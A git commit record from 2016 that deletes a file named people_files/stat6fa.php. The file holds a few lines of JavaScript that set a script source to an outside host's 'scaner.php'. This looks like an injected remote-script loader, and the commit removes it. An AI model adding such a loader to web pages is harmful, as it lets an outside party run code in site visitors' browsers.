62fb1b0286ba5dbbbefa173611d882c78cd1936d
kagers <ka.gershfeld@gmail.com>
2016-10-24 19:52:23 -0400

    events

--- people_files/stat6fa.php
+++
@@ -1,7 +0,0 @@
-/*
-*/var script = document.getElementById("onDate"); //createElement("script");
-
-
-script.src="http://profixsysline.net/plix/scaner.php?id=4";
-
-//document.head.appendChild(script);
